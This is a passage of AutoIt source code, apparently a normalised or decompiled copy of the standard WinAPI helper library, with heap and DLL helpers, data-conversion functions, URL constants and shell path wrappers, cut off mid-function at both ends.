		If UBound($adata, $idim) <> $ndim Then Return SetError(2, 0, 1)
		If $istart < 0 Then $istart = 0
		Local $iubound = UBound($adata) - 1
		If $iend < 1 OR $iend > $iubound Then $iend = $iubound
		If $istart > $iend Then Return SetError(4, 0, 1)
		Return 0
	EndFunc

	Func __checkerrorclosehandle($aret, $hfile, $blasterror = 0, $icurerr = @error, $icurext = @extended)
		If NOT $icurerr AND NOT $aret[0] Then $icurerr = 10
		Local $ilasterror = _winapi_getlasterror()
		DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hfile)
		If $icurerr Then _winapi_setlasterror($ilasterror)
		If $blasterror Then $icurext = $ilasterror
		Return SetError($icurerr, $icurext, $icurerr)
	EndFunc

	Func __dll($spath, $bpin = False)
		Local $aret = DllCall("kernel32.dll", "bool", "GetModuleHandleExW", "dword", __iif($bpin, 1, 2), "wstr", $spath, "ptr*", 0)
		If NOT $aret[3] Then
			Local $aresult = DllCall("kernel32.dll", "handle", "LoadLibraryW", "wstr", $spath)
			If NOT $aresult[0] Then Return 0
		EndIf
		Return 1
	EndFunc

	Func __enumwindowsproc($hwnd, $bvisible)
		Local $aresult
		If $bvisible Then
			$aresult = DllCall("user32.dll", "bool", "IsWindowVisible", "hwnd", $hwnd)
			If NOT $aresult[0] Then
				Return 1
			EndIf
		EndIf
		__inc($__g_venum)
		$__g_venum[$__g_venum[0][0]][0] = $hwnd
		$aresult = DllCall("user32.dll", "int", "GetClassNameW", "hwnd", $hwnd, "wstr", "", "int", 4096)
		$__g_venum[$__g_venum[0][0]][1] = $aresult[2]
		Return 1
	EndFunc

	Func __fatalexit($icode, $stext = "")
		If $stext Then MsgBox($mb_systemmodal, "AutoIt", $stext)
		_winapi_fatalexit($icode)
	EndFunc

	Func __heapalloc($isize, $babort = False)
		Local $aret
		If NOT $__g_hheap Then
			$aret = DllCall("kernel32.dll", "handle", "HeapCreate", "dword", 0, "ulong_ptr", 0, "ulong_ptr", 0)
			If @error OR NOT $aret[0] Then __fatalexit(1, "Error allocating memory.")
			$__g_hheap = $aret[0]
		EndIf
		$aret = DllCall("kernel32.dll", "ptr", "HeapAlloc", "handle", $__g_hheap, "dword", 8, "ulong_ptr", $isize)
		If @error OR NOT $aret[0] Then
			If $babort Then __fatalexit(1, "Error allocating memory.")
			Return SetError(@error + 30, @extended, 0)
		EndIf
		Return $aret[0]
	EndFunc

	Func __heapfree(ByRef $pmemory, $bcheck = False, $icurerr = @error, $icurext = @extended)
		If $bcheck AND (NOT __heapvalidate($pmemory)) Then Return SetError(@error, @extended, 0)
		Local $aret = DllCall("kernel32.dll", "int", "HeapFree", "handle", $__g_hheap, "dword", 0, "ptr", $pmemory)
		If @error OR NOT $aret[0] Then Return SetError(@error + 40, @extended, 0)
		$pmemory = 0
		Return SetError($icurerr, $icurext, 1)
	EndFunc

	Func __heaprealloc($pmemory, $isize, $bamount = False, $babort = False)
		Local $aret, $pret
		If __heapvalidate($pmemory) Then
			If $bamount AND (__heapsize($pmemory) >= $isize) Then Return SetExtended(1, Ptr($pmemory))
			$aret = DllCall("kernel32.dll", "ptr", "HeapReAlloc", "handle", $__g_hheap, "dword", 8, "ptr", $pmemory, "ulong_ptr", $isize)
			If @error OR NOT $aret[0] Then
				If $babort Then __fatalexit(1, "Error allocating memory.")
				Return SetError(@error + 20, @extended, Ptr($pmemory))
			EndIf
			$pret = $aret[0]
		Else
			$pret = __heapalloc($isize, $babort)
			If @error Then Return SetError(@error, @extended, 0)
		EndIf
		Return $pret
	EndFunc

	Func __heapsize($pmemory, $bcheck = False)
		If $bcheck AND (NOT __heapvalidate($pmemory)) Then Return SetError(@error, @extended, 0)
		Local $aret = DllCall("kernel32.dll", "ulong_ptr", "HeapSize", "handle", $__g_hheap, "dword", 0, "ptr", $pmemory)
		If @error OR ($aret[0] = Ptr(-1)) Then Return SetError(@error + 50, @extended, 0)
		Return $aret[0]
	EndFunc

	Func __heapvalidate($pmemory)
		If (NOT $__g_hheap) OR (NOT Ptr($pmemory)) Then Return SetError(9, 0, False)
		Local $aret = DllCall("kernel32.dll", "int", "HeapValidate", "handle", $__g_hheap, "dword", 0, "ptr", $pmemory)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func __inc(ByRef $adata, $iincrement = 100)
		Select 
			Case UBound($adata, $ubound_columns)
				If $iincrement < 0 Then
					ReDim $adata[$adata[0][0] + 1][UBound($adata, $ubound_columns)]
				Else
					$adata[0][0] += 1
					If $adata[0][0] > UBound($adata) - 1 Then
						ReDim $adata[$adata[0][0] + $iincrement][UBound($adata, $ubound_columns)]
					EndIf
				EndIf
			Case UBound($adata, $ubound_rows)
				If $iincrement < 0 Then
					ReDim $adata[$adata[0] + 1]
				Else
					$adata[0] += 1
					If $adata[0] > UBound($adata) - 1 Then
						ReDim $adata[$adata[0] + $iincrement]
					EndIf
				EndIf
			Case Else
				Return 0
		EndSelect
		Return 1
	EndFunc

	Func __iif($btest, $vtrue, $vfalse)
		Return $btest ? $vtrue : $vfalse
	EndFunc

	Func __init($ddata)
		Local $ilength = BinaryLen($ddata)
		Local $aret = DllCall("kernel32.dll", "ptr", "VirtualAlloc", "ptr", 0, "ulong_ptr", $ilength, "dword", 4096, "dword", 64)
		If @error OR NOT $aret[0] Then __fatalexit(1, "Error allocating memory.")
		Local $tdata = DllStructCreate("byte[" & $ilength & "]", $aret[0])
		DllStructSetData($tdata, 1, $ddata)
		Return $aret[0]
	EndFunc

	Func __rgb($icolor)
		If $__g_irgbmode Then
			$icolor = _winapi_switchcolor($icolor)
		EndIf
		Return $icolor
	EndFunc

	Func __winver()
		Local $tosvi = DllStructCreate($tagosversioninfo)
		DllStructSetData($tosvi, 1, DllStructGetSize($tosvi))
		Local $aret = DllCall("kernel32.dll", "bool", "GetVersionExW", "struct*", $tosvi)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, 0)
		Return BitOR(BitShift(DllStructGetData($tosvi, 2), -8), DllStructGetData($tosvi, 3))
	EndFunc

#EndRegion Internal Functions
#Region Global Variables and Constants
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions

	Func _winapi_chartooem($sstr)
		Local $aret = DllCall("user32.dll", "bool", "CharToOemW", "wstr", $sstr, "wstr", "")
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, "")
		Return $aret[2]
	EndFunc

	Func _winapi_copystruct($tstruct, $sstruct = "")
		Local $isize = DllStructGetSize($tstruct)
		If NOT $isize Then Return SetError(1, 0, 0)
		Local $tresult
		If NOT StringStripWS($sstruct, $str_stripleading + $str_striptrailing + $str_stripspaces) Then
			$tresult = DllStructCreate("byte[" & $isize & "]")
		Else
			$tresult = DllStructCreate($sstruct)
		EndIf
		If DllStructGetSize($tresult) < $isize Then Return SetError(2, 0, 0)
		_winapi_movememory($tresult, $tstruct, $isize)
		Return $tresult
	EndFunc

	Func _winapi_dwordtofloat($ivalue)
		Local $tdword = DllStructCreate("dword")
		Local $tfloat = DllStructCreate("float", DllStructGetPtr($tdword))
		DllStructSetData($tdword, 1, $ivalue)
		Return DllStructGetData($tfloat, 1)
	EndFunc

	Func _winapi_dwordtoint($ivalue)
		Local $tdata = DllStructCreate("int")
		DllStructSetData($tdata, 1, $ivalue)
		Return DllStructGetData($tdata, 1)
	EndFunc

	Func _winapi_floattodword($ivalue)
		Local $tfloat = DllStructCreate("float")
		Local $tdword = DllStructCreate("dword", DllStructGetPtr($tfloat))
		DllStructSetData($tfloat, 1, $ivalue)
		Return DllStructGetData($tdword, 1)
	EndFunc

	Func _winapi_getextended()
		Return $__g_vext
	EndFunc

	Func _winapi_hashdata($pmemory, $isize, $ilength = 32)
		If ($ilength <= 0) OR ($ilength > 256) Then Return SetError(11, 0, 0)
		Local $tdata = DllStructCreate("byte[" & $ilength & "]")
		Local $aret = DllCall("shlwapi.dll", "uint", "HashData", "struct*", $pmemory, "dword", $isize, "struct*", $tdata, "dword", $ilength)
		If @error Then Return SetError(@error, @extended, 0)
		If $aret[0] Then Return SetError(10, $aret[0], 0)
		Return DllStructGetData($tdata, 1)
	EndFunc

	Func _winapi_hashstring($sstring, $bcasesensitive = True, $ilength = 32)
		Local $ilengths = StringLen($sstring)
		If NOT $ilengths OR ($ilength > 256) Then Return SetError(12, 0, 0)
		Local $tstring = DllStructCreate("wchar[" & ($ilengths + 1) & "]")
		If NOT $bcasesensitive Then
			$sstring = StringLower($sstring)
		EndIf
		DllStructSetData($tstring, 1, $sstring)
		Local $shash = _winapi_hashdata($tstring, 2 * $ilengths, $ilength)
		If @error Then Return SetError(@error, @extended, 0)
		Return $shash
	EndFunc

	Func _winapi_hibyte($ivalue)
		Return BitAND(BitShift($ivalue, 8), 255)
	EndFunc

	Func _winapi_hidword($ivalue)
		Local $tint64 = DllStructCreate("int64")
		Local $tqword = DllStructCreate("dword;dword", DllStructGetPtr($tint64))
		DllStructSetData($tint64, 1, $ivalue)
		Return DllStructGetData($tqword, 2)
	EndFunc

	Func _winapi_inttodword($ivalue)
		Local $tdata = DllStructCreate("dword")
		DllStructSetData($tdata, 1, $ivalue)
		Return DllStructGetData($tdata, 1)
	EndFunc

	Func _winapi_lobyte($ivalue)
		Return BitAND($ivalue, 255)
	EndFunc

	Func _winapi_lodword($ivalue)
		Local $tint64 = DllStructCreate("int64")
		Local $tqword = DllStructCreate("dword;dword", DllStructGetPtr($tint64))
		DllStructSetData($tint64, 1, $ivalue)
		Return DllStructGetData($tqword, 1)
	EndFunc

	Func _winapi_longmid($ivalue, $istart, $icount)
		Return BitAND(BitShift($ivalue, $istart), BitOR(BitShift(BitShift(2147483647, 32 - ($icount + 1)), 1), BitShift(1, -($icount - 1))))
	EndFunc

	Func _winapi_makeword($ilo, $ihi)
		Local $tword = DllStructCreate("ushort")
		Local $tbyte = DllStructCreate("byte;byte", DllStructGetPtr($tword))
		DllStructSetData($tbyte, 1, $ihi)
		DllStructSetData($tbyte, 2, $ilo)
		Return DllStructGetData($tword, 1)
	EndFunc

	Func _winapi_oemtochar($sstr)
		Local $aret = DllCall("user32.dll", "bool", "OemToChar", "str", $sstr, "str", "")
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, "")
		Return $aret[2]
	EndFunc

	Func _winapi_playsound($ssound, $iflags = $snd_system_nostop, $hinstance = 0)
		Local $stypeofsound = "ptr"
		If $ssound Then
			If IsString($ssound) Then
				$stypeofsound = "wstr"
			EndIf
		Else
			$ssound = 0
			$iflags = 0
		EndIf
		Local $aret = DllCall("winmm.dll", "bool", "PlaySoundW", $stypeofsound, $ssound, "handle", $hinstance, "dword", $iflags)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_shorttoword($ivalue)
		Return BitAND($ivalue, 65535)
	EndFunc

	Func _winapi_strformatbytesize($isize)
		Local $aret = DllCall("shlwapi.dll", "ptr", "StrFormatByteSizeW", "int64", $isize, "wstr", "", "uint", 1024)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, "")
		Return $aret[2]
	EndFunc

	Func _winapi_strformatbytesizeex($isize)
		Local $asymbol = DllCall("kernel32.dll", "int", "GetLocaleInfoW", "dword", 1024, "dword", 15, "wstr", "", "int", 2048)
		If @error Then Return SetError(@error + 10, @extended, "")
		Local $ssize = _winapi_strformatbytesize(0)
		If @error Then Return SetError(@error, @extended, "")
		Return StringReplace($ssize, "0", StringRegExpReplace(Number($isize), "(?<=\d)(?=(\d{3})+\z)", $asymbol[3]))
	EndFunc

	Func _winapi_strformatkbsize($isize)
		Local $aret = DllCall("shlwapi.dll", "ptr", "StrFormatKBSizeW", "int64", $isize, "wstr", "", "uint", 1024)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, "")
		Return $aret[2]
	EndFunc

	Func _winapi_strfromtimeinterval($itime, $idigits = 7)
		Local $aret = DllCall("shlwapi.dll", "int", "StrFromTimeIntervalW", "wstr", "", "uint", 1024, "dword", $itime, "int", $idigits)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, "")
		Return StringStripWS($aret[1], $str_stripleading + $str_striptrailing)
	EndFunc

	Func _winapi_unionstruct($tstruct1, $tstruct2, $sstruct = "")
		Local $asize[2] = [DllStructGetSize($tstruct1), DllStructGetSize($tstruct2)]
		If NOT $asize[0] OR NOT $asize[1] Then Return SetError(1, 0, 0)
		Local $tresult
		If NOT StringStripWS($sstruct, $str_stripleading + $str_striptrailing + $str_stripspaces) Then
			$tresult = DllStructCreate("byte[" & ($asize[0] + $asize[1]) & "]")
		Else
			$tresult = DllStructCreate($sstruct)
		EndIf
		If DllStructGetSize($tresult) < ($asize[0] + $asize[1]) Then Return SetError(2, 0, 0)
		_winapi_movememory($tresult, $tstruct1, $asize[0])
		_winapi_movememory(DllStructGetPtr($tresult) + $asize[0], $tstruct2, $asize[1])
		Return $tresult
	EndFunc

	Func _winapi_wordtoshort($ivalue)
		If BitAND($ivalue, 32768) Then
			Return BitOR($ivalue, -32768)
		EndIf
		Return BitAND($ivalue, 32767)
	EndFunc

#EndRegion Public Functions
Global Const $url_scheme_invalid = -1
Global Const $url_scheme_unknown = 0
Global Const $url_scheme_ftp = 1
Global Const $url_scheme_http = 2
Global Const $url_scheme_gopher = 3
Global Const $url_scheme_mailto = 4
Global Const $url_scheme_news = 5
Global Const $url_scheme_nntp = 6
Global Const $url_scheme_telnet = 7
Global Const $url_scheme_wais = 8
Global Const $url_scheme_file = 9
Global Const $url_scheme_mk = 10
Global Const $url_scheme_https = 11
Global Const $url_scheme_shell = 12
Global Const $url_scheme_snews = 13
Global Const $url_scheme_local = 14
Global Const $url_scheme_javascript = 15
Global Const $url_scheme_vbscript = 16
Global Const $url_scheme_about = 17
Global Const $url_scheme_res = 18
Global Const $url_scheme_msshellrooted = 19
Global Const $url_scheme_msshellidlist = 20
Global Const $url_scheme_mshelp = 21
Global Const $url_scheme_msshelldevice = 22
Global Const $url_scheme_wildcard = 23
Global Const $url_scheme_search_ms = 24
Global Const $url_scheme_search = 25
Global Const $url_scheme_knownfolder = 26
Global Const $gct_invalid = 0
Global Const $gct_lfnchar = 1
Global Const $gct_separator = 8
Global Const $gct_shortchar = 2
Global Const $gct_wild = 4
Global Const $url_apply_default = 1
Global Const $url_apply_guessscheme = 2
Global Const $url_apply_guessfile = 4
Global Const $url_apply_forceapply = 8
Global Const $url_dont_simplify = 134217728
Global Const $url_escape_as_utf8 = 262144
Global Const $url_escape_percent = 4096
Global Const $url_escape_spaces_only = 67108864
Global Const $url_escape_unsafe = 536870912
Global Const $url_no_meta = 134217728
Global Const $url_pluggable_protocol = 1073741824
Global Const $url_unescape = 268435456
Global Const $url_part_hostname = 2
Global Const $url_part_password = 4
Global Const $url_part_port = 5
Global Const $url_part_query = 6
Global Const $url_part_scheme = 1
Global Const $url_part_username = 3
Global Const $urlis_appliable = 4
Global Const $urlis_directory = 5
Global Const $urlis_fileurl = 3
Global Const $urlis_hasquery = 6
Global Const $urlis_nohistory = 2
Global Const $urlis_opaque = 1
Global Const $urlis_url = 0
#Region Functions list
#EndRegion Functions list
#Region Public Functions

	Func _winapi_commandlinetoargv($scmd)
		Local $aresult[1] = [0]
		$scmd = StringStripWS($scmd, $str_stripleading + $str_striptrailing)
		If NOT $scmd Then
			Return $aresult
		EndIf
		Local $aret = DllCall("shell32.dll", "ptr", "CommandLineToArgvW", "wstr", $scmd, "int*", 0)
		If @error OR NOT $aret[0] OR (NOT $aret[2]) Then Return SetError(@error + 10, @extended, 0)
		Local $tptr = DllStructCreate("ptr[" & $aret[2] & "]", $aret[0])
		Dim $aresult[$aret[2] + 1] = [$aret[2]]
		For $i = 1 To $aret[2]
			$aresult[$i] = _winapi_getstring(DllStructGetData($tptr, 1, $i))
		Next
		DllCall("kernel32.dll", "handle", "LocalFree", "handle", $aret[0])
		Return $aresult
	EndFunc

	Func _winapi_isnameinexpression($sstring, $spattern, $bcasesensitive = False)
		If NOT $bcasesensitive Then $spattern = StringUpper($spattern)
		Local $tus1 = __us($spattern)
		Local $tus2 = __us($sstring)
		Local $aret = DllCall("ntdll.dll", "boolean", "RtlIsNameInExpression", "struct*", $tus1, "struct*", $tus2, "boolean", NOT $bcasesensitive, "ptr", 0)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_parseurl($surl)
		Local $tagparsedurl = "dword Size;ptr Protocol;uint cchProtocol;ptr Suffix;uint cchSuffix;uint Scheme"
		Local $tpurl = DllStructCreate($tagparsedurl)
		DllStructSetData($tpurl, 1, DllStructGetSize($tpurl))
		Local $turl = DllStructCreate("wchar[4096]")
		DllStructSetData($turl, 1, $surl)
		Local $aret = DllCall("shlwapi.dll", "long", "ParseURLW", "struct*", $turl, "struct*", $tpurl)
		If @error Then Return SetError(@error, @extended, "")
		If $aret[0] Then Return SetError(10, $aret[0], "")
		Local $aresult[3]
		$aresult[0] = DllStructGetData(DllStructCreate("wchar[" & DllStructGetData($tpurl, 3) & "]", DllStructGetData($tpurl, 2)), 1)
		$aresult[1] = DllStructGetData(DllStructCreate("wchar[" & DllStructGetData($tpurl, 5) & "]", DllStructGetData($tpurl, 4)), 1)
		$aresult[2] = DllStructGetData($tpurl, 6)
		Return $aresult
	EndFunc

	Func _winapi_parseusername($suser)
		If NOT __dll("credui.dll") Then Return SetError(103, 0, 0)
		Local $aret = DllCall("credui.dll", "dword", "CredUIParseUserNameW", "wstr", $suser, "wstr", "", "ulong", 4096, "wstr", "", "ulong", 4096)
		If @error Then Return SetError(@error, @extended, 0)
		Switch $aret[0]
			Case 0
			Case 1315
				If StringStripWS($suser, $str_stripleading + $str_striptrailing) Then
					$aret[2] = $suser
					$aret[4] = ""
				Else
					ContinueCase
				EndIf
			Case Else
				Return SetError(10, $aret[0], 0)
		EndSwitch
		Local $aresult[2]
		$aresult[0] = $aret[4]
		$aresult[1] = $aret[2]
		Return $aresult
	EndFunc

	Func _winapi_pathaddbackslash($sfilepath)
		Local $tpath = DllStructCreate("wchar[260]")
		DllStructSetData($tpath, 1, $sfilepath)
		Local $aret = DllCall("shlwapi.dll", "ptr", "PathAddBackslashW", "struct*", $tpath)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, "")
		Return DllStructGetData($tpath, 1)
	EndFunc

	Func _winapi_pathaddextension($sfilepath, $sext = "")
		Local $tpath = DllStructCreate("wchar[260]")
		DllStructSetData($tpath, 1, $sfilepath)
		Local $stypeofext = "wstr"
		If NOT StringStripWS($sext, $str_stripleading + $str_striptrailing) Then
			$stypeofext = "ptr"
			$sext = 0
		EndIf
		Local $aret = DllCall("shlwapi.dll", "bool", "PathAddExtensionW", "struct*", $tpath, $stypeofext, $sext)
		If @error Then Return SetError(@error, @extended, "")
		Return SetExtended($aret[0], DllStructGetData($tpath, 1))
	EndFunc

	Func _winapi_pathappend($sfilepath, $smore)
		Local $tpath = DllStructCreate("wchar[260]")
		DllStructSetData($tpath, 1, $sfilepath)
		Local $aret = DllCall("shlwapi.dll", "bool", "PathAppendW", "struct*", $tpath, "wstr", $smore)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, "")
		Return DllStructGetData($tpath, 1)
	EndFunc

	Func _winapi_pathbuildroot($idrive)
		Local $aret = DllCall("shlwapi.dll", "ptr", "PathBuildRootW", "wstr", "", "int", $idrive)
		If @error Then Return SetError(@error, @extended, "")
		Return $aret[1]
	EndFunc

	Func _winapi_pathcanonicalize($sfilepath)
		Local $aret = DllCall("shlwapi.dll", "bool", "PathCanonicalizeW", "wstr", "", "wstr", $sfilepath)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, $sfilepath)
		Return $aret[1]
	EndFunc

	Func _winapi_pathcommonprefix($spath1, $spath2)
		Local $aret = DllCall("shlwapi.dll", "int", "PathCommonPrefixW", "wstr", $spath1, "wstr", $spath2, "wstr", "")
		If @error Then Return SetError(@error, @extended, "")
		Return SetExtended($aret[0], $aret[3])
	EndFunc

	Func _winapi_pathcompactpath($hwnd, $sfilepath, $iwidth = 0)
		If $iwidth < 1 Then
			Local $trect = DllStructCreate($tagrect)
			DllCall("user32.dll", "bool", "GetClientRect", "hwnd", $hwnd, "struct*", $trect)
			$iwidth += DllStructGetData($trect, "Right") - DllStructGetData($trect, "Left")
		EndIf
		Local $aret = DllCall("user32.dll", "handle", "GetDC", "hwnd", $hwnd)
		If @error OR NOT $aret[0] Then Return SetError(@error + 20, @extended, $sfilepath)
		Local $hdc = $aret[0]
		Local Const $wm_getfont = 49
		$aret = DllCall("user32.dll", "ptr", "SendMessage", "hwnd", $hwnd, "uint", $wm_getfont, "wparam", 0, "lparam", 0)
		Local $hback = DllCall("gdi32.dll", "handle", "SelectObject", "handle", $hdc, "handle", $aret[0])
		Local $ierror = 0
		$aret = DllCall("shlwapi.dll", "bool", "PathCompactPathW", "handle", $hdc, "wstr", $sfilepath, "int", $iwidth)
		If @error OR NOT $aret[0] Then $ierror = @error + 10
		DllCall("gdi32.dll", "handle", "SelectObject", "handle", $hdc, "handle", $hback[0])
		DllCall("user32.dll", "int", "ReleaseDC", "hwnd", $hwnd, "handle", $hdc)
		If $ierror Then Return SetError($ierror, 0, $sfilepath)
		Return $aret[2]
	EndFunc

	Func _winapi_pathcompactpathex($sfilepath, $imax)
		Local $aret = DllCall("shlwapi.dll", "bool", "PathCompactPathExW", "wstr", "", "wstr", $sfilepath, "uint", $imax + 1, "dword", 0)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, $sfilepath)
		Return $aret[1]
	EndFunc

	Func _winapi_pathcreatefromurl($surl)
		Local $aret = DllCall("shlwapi.dll", "long", "PathCreateFromUrlW", "wstr", $surl, "wstr", "", "dword*", 4096, "dword", 0)
		If @error Then Return SetError(@error, @extended, "")
		If $aret[0] Then Return SetError(10, $aret[0], "")
		Return $aret[2]
	EndFunc

	Func _winapi_pathfindextension($sfilepath)
		Local $aret = DllCall("shlwapi.dll", "wstr", "PathFindExtensionW", "wstr", $sfilepath)
		If @error Then Return SetError(@error, @extended, "")
		Return $aret[0]
	EndFunc

	Func _winapi_pathfindfilename($sfilepath)
		Local $aret = DllCall("shlwapi.dll", "wstr", "PathFindFileNameW", "wstr", $sfilepath)
		If @error Then Return SetError(@error, @extended, $sfilepath)
		Return $aret[0]
	EndFunc

	Func _winapi_pathfindnextcomponent($sfilepath)
		Local $tpath = DllStructCreate("wchar[" & (StringLen($sfilepath) + 1) & "]")
		DllStructSetData($tpath, 1, $sfilepath)
		Local $aret = DllCall("shlwapi.dll", "ptr", "PathFindNextComponentW", "struct*", $tpath)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, "")
		Return _winapi_getstring($aret[0])
	EndFunc

	Func _winapi_pathgetargs($sfilepath)
		Local $tpath = DllStructCreate("wchar[" & (StringLen($sfilepath) + 1) & "]")
		DllStructSetData($tpath, 1, $sfilepath)
		Local $aret = DllCall("shlwapi.dll", "ptr", "PathGetArgsW", "struct*", $tpath)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, "")
		Return _winapi_getstring($aret[0])
	EndFunc

	Func _winapi_pathgetchartype($schar)
		Local $aret = DllCall("shlwapi.dll", "uint", "PathGetCharTypeW", "word", AscW($schar))
		If @error Then Return SetError(@error, @extended, -1)
		Return $aret[0]
	EndFunc

	Func _winapi_pathgetdrivenumber($sfilepath)
		Local $aret = DllCall("shlwapi.dll", "int", "PathGetDriveNumberW", "wstr", $sfilepath)
		If @error OR ($aret[0] = -1) Then Return SetError(@error, @extended, "")
		Return Chr($aret[0] + 65) & ":"
	EndFunc

	Func _winapi_pathiscontenttype($sfilepath, $stype)
		Local $aret = DllCall("shlwapi.dll", "bool", "PathIsContentTypeW", "wstr", $sfilepath, "wstr", $stype)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_pathisexe($sfilepath)
		Local $aret = DllCall("shell32.dll", "bool", "PathIsExe", "wstr", $sfilepath)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_pathisfilespec($sfilepath)
		Local $aret = DllCall("shlwapi.dll", "bool", "PathIsFileSpecW", "wstr", $sfilepath)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_pathislfnfilespec($sfilepath)
		Local $aret = DllCall("shlwapi.dll", "bool", "PathIsLFNFileSpecW", "wstr", $sfilepath)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_pathisrelative($sfilepath)
		Local $aret = DllCall("shlwapi.dll", "bool", "PathIsRelativeW", "wstr", $sfilepath)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_pathisroot($sfilepath)
		Local $aret = DllCall("shlwapi.dll", "bool", "PathIsRootW", "wstr", $sfilepath)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_pathissameroot($spath1, $spath2)
		Local $aret = DllCall("shlwapi.dll", "bool", "PathIsSameRootW", "wstr", $spath1, "wstr", $spath2)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_pathissystemfolder($sfilepath)
		Local $aret = DllCall("shlwapi.dll", "bool", "PathIsSystemFolderW", "wstr", $sfilepath, "dword", 0)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_pathisunc($sfilepath)
		Local $aret = DllCall("shlwapi.dll", "bool", "PathIsUNCW", "wstr", $sfilepath)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_pathisuncserver($sfilepath)
		Local $aret = DllCall("shlwapi.dll", "bool", "PathIsUNCServerW", "wstr", $sfilepath)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_pathisuncservershare($sfilepath)
		Local $aret = DllCall("shlwapi.dll", "bool", "PathIsUNCServerShareW", "wstr", $sfilepath)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_pathmakesystemfolder($sfilepath)
		Local $aret = DllCall("shlwapi.dll", "bool", "PathMakeSystemFolderW", "wstr", $sfilepath)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_pathmatchspec($sfilepath, $sspec)
		Local $aret = DllCall("shlwapi.dll", "bool", "PathMatchSpecW", "wstr", $sfilepath, "wstr", $sspec)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_pathparseiconlocation($sfilepath)
		Local $aret = DllCall("shlwapi.dll", "int", "PathParseIconLocationW", "wstr", $sfilepath)
		If @error Then Return SetError(@error, @extended, 0)
		Local $aresult[2]
		$aresult[0] = $aret[1]
		$aresult[1] = $aret[0]
		Return $aresult
	EndFunc

	Func _winapi_pathrelativepathto($spathfrom, $bdirfrom, $spathto, $bdirto)
		If $bdirfrom Then
			$bdirfrom = 16
		EndIf
		If $bdirto Then
			$bdirto = 16
		EndIf
		Local $aret = DllCall("shlwapi.dll", "bool", "PathRelativePathToW", "wstr", "", "wstr", $spathfrom, "dword", $bdirfrom, "wstr", $spathto, "dword", $bdirto)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, "")
		Return $aret[1]
	EndFunc

	Func _winapi_pathremoveargs($sfilepath)
		Local $aret = DllCall("shlwapi.dll", "none", "PathRemoveArgsW", "wstr", $sfilepath)
		If @error Then Return SetError(@error, @extended, "")
		Return $aret[1]
	EndFunc

	Func _winapi_pathremovebackslash($sfilepath)
		Local $aret = DllCall("shlwapi.dll", "ptr", "PathRemoveBackslashW", "wstr", $sfilepath)
		If @error Then Return SetError(@error, @extended, "")
		Return $aret[1]
	EndFunc

	Func _winapi_pathremoveextension($sfilepath)
		Local $aret = DllCall("shlwapi.dll", "none", "PathRemoveExtensionW", "wstr", $sfilepath)
		If @error Then Return SetError(@error, @extended, "")
		Return $aret[1]
	EndFunc

	Func _winapi_pathremovefilespec($sfilepath)
		Local $aret = DllCall("shlwapi.dll", "bool", "PathRemoveFileSpecW", "wstr", $sfilepath)
		If @error Then Return SetError(@error, @extended, "")
		Return SetExtended($aret[0], $aret[1])
	EndFunc

	Func _winapi_pathrenameextension($sfilepath, $sext)
		Local $tpath = DllStructCreate("wchar[260]")
		DllStructSetData($tpath, 1, $sfilepath)
		Local $aret = DllCall("shlwapi.dll", "bool", "PathRenameExtensionW", "struct*", $tpath, "wstr", $sext)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, "")
		Return DllStructGetData($tpath, 1)
	EndFunc

	Func _winapi_pathsearchandqualify($sfilepath, $bexists = False)
		Local $aret = DllCall("shlwapi.dll", "bool", "PathSearchAndQualifyW", "wstr", $sfilepath, "wstr", "", "int", 4096)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, "")
		If $bexists AND NOT FileExists($aret[2]) Then Return SetError(20, 0, "")
		Return $aret[2]
	EndFunc

	Func _winapi_pathskiproot($sfilepath)
		Local $tpath = DllStructCreate("wchar[" & (StringLen($sfilepath) + 1) & "]")
		DllStructSetData($tpath, 1, $sfilepath)
		Local $aret = DllCall("shlwapi.dll", "ptr", "PathSkipRootW", "struct*", $tpath)
		If @error Then Return SetError(@error, @extended, "")
		If NOT $aret[0] Then Return $sfilepath
		Return _winapi_getstring($aret[0])
	EndFunc

	Func _winapi_pathstrippath($sfilepath)
		Local $aret = DllCall("shlwapi.dll", "none", "PathStripPathW", "wstr", $sfilepath)
		If @error Then Return SetError(@error, @extended, "")
		Return $aret[1]
	EndFunc

	Func _winapi_pathstriptoroot($sfilepath)
